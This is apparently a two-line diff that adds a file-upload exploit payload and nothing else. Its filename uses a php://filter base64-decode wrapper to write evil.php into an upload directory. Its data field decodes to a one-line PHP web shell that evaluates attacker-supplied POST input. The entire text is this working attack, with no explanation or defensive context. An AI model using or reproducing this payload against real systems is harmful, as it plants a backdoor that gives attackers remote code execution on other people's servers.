@@ -1,0 +1,2 @@
+filename:php://filter/write=convert.base64-decode/resource=upload/858e65a2-6e71-42b1-9588-d8f5c2c1e2de/evil.php
+"data":"PD9waHAgQGV2YWwoJF9QT1NUWycxMjMnXSk7Pz4="
